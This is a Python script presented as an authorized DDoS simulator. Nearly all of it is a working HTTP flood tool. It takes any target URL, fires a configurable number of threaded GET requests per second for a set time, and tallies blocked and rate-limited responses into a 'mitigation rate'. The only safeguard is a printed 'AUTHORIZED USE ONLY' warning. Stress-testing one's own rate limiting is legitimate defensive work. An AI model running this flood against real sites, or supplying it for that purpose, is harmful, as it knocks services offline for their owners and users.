"""DDoS Attack Simulation Tools (AUTHORIZED USE ONLY)"""
import requests
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class AttackSimulator:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.results = {'total_requests': 0, 'successful': 0, 'blocked': 0, 'rate_limited': 0, 'errors': 0}
        self._lock = threading.Lock()

    def http_flood(self, duration=30, rps=100):
        print(f"\n[!] WARNING: AUTHORIZED USE ONLY")
        print(f"[*] Target:   {self.target_url}")
        print(f"[*] Rate:     {rps} req/s")
        print(f"[*] Duration: {duration}s")
        print(f"[*] Workers:  {min(rps, 50)}")
        print(f"{'='*50}")

        end_time = time.time() + duration
        with ThreadPoolExecutor(max_workers=min(rps, 50)) as executor:
            while time.time() < end_time:
                remaining = end_time - time.time()
                if remaining <= 0:
                    break
                futures = [executor.submit(self._send_request, 'GET', '/') for _ in range(rps)]
                for f in as_completed(futures):
                    pass
                elapsed = duration - remaining
                print(f"\r[*] Elapsed: {int(elapsed)}s | Total: {self.results['total_requests']} | "
                      f"OK: {self.results['successful']} | Blocked: {self.results['blocked']} | "
                      f"RateLimited: {self.results['rate_limited']}", end='', flush=True)
                time.sleep(1)

        print()
        self._print_results("HTTP Flood")

    def _send_request(self, method, endpoint):
        try:
            response = requests.request(method=method, url=f"{self.target_url}{endpoint}", timeout=5)
            with self._lock:
                self.results['total_requests'] += 1
                if response.status_code == 200:
                    self.results['successful'] += 1
                elif response.status_code == 403:
                    self.results['blocked'] += 1
                elif response.status_code == 429:
                    self.results['rate_limited'] += 1
        except requests.exceptions.RequestException:
            with self._lock:
                self.results['total_requests'] += 1
                self.results['errors'] += 1

    def _print_results(self, attack_type):
        r = self.results
        total = r['total_requests'] or 1
        print(f"\n{'='*50}")
        print(f" Results: {attack_type}")
        print(f"{'='*50}")
        print(f" Total Requests:  {r['total_requests']}")
        print(f" Successful:      {r['successful']} ({r['successful']/total*100:.1f}%)")
        print(f" Blocked (403):   {r['blocked']} ({r['blocked']/total*100:.1f}%)")
        print(f" Rate Limited:    {r['rate_limited']} ({r['rate_limited']/total*100:.1f}%)")
        print(f" Errors:          {r['errors']} ({r['errors']/total*100:.1f}%)")
        print(f"{'='*50}")
        mitigation_rate = (r['blocked'] + r['rate_limited']) / total * 100
        print(f" Mitigation Rate: {mitigation_rate:.1f}%")
        print(f"{'='*50}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS Attack Simulator (AUTHORIZED USE ONLY)')
    parser.add_argument('--target', required=True, help='Target URL (e.g. http://localhost:80)')
    parser.add_argument('--type', default='http-flood', choices=['http-flood'], help='Attack type')
    parser.add_argument('--duration', type=int, default=30, help='Duration in seconds')
    parser.add_argument('--rps', type=int, default=100, help='Requests per second')
    args = parser.parse_args()

    simulator = AttackSimulator(args.target)
    if args.type == 'http-flood':
        simulator.http_flood(duration=args.duration, rps=args.rps)
